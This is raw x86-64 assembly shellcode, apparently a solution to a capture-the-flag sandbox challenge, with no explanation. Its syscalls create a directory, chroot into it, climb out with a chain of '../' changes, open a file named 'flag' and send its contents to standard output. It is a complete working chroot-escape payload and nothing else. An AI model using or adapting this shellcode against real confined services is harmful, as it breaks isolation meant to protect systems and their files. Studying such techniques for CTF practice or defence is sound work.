xor rax, rax
mov rax, 0x657061637365
push rax
push rsp

xor rsi, rsi 
mov rdi, [RSP + 0] 
mov rax, 0x53
syscall ; Syscall
add RSP, 16

xor rax, rax
mov rax, 0x657061637365
push rax
push rsp

mov rdi, [RSP + 0] 
mov rax, 0xa1
syscall ; Syscall
add RSP, 16

xor rax, rax
mov rax, 0x2f2e2e2f2e2e2f
push rax
mov rax, 0x2e2e2f2e2e2f2e2e
push rax
push rsp

mov rdi, [RSP + 0] 
mov rax, 0x50
syscall ; Syscall
add RSP, 24

xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rsi, rsi 
mov rdi, [RSP + 0] 
mov rax, 0x2
syscall ; Syscall
add RSP, 16

mov r10, 0x28
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall ; Syscall

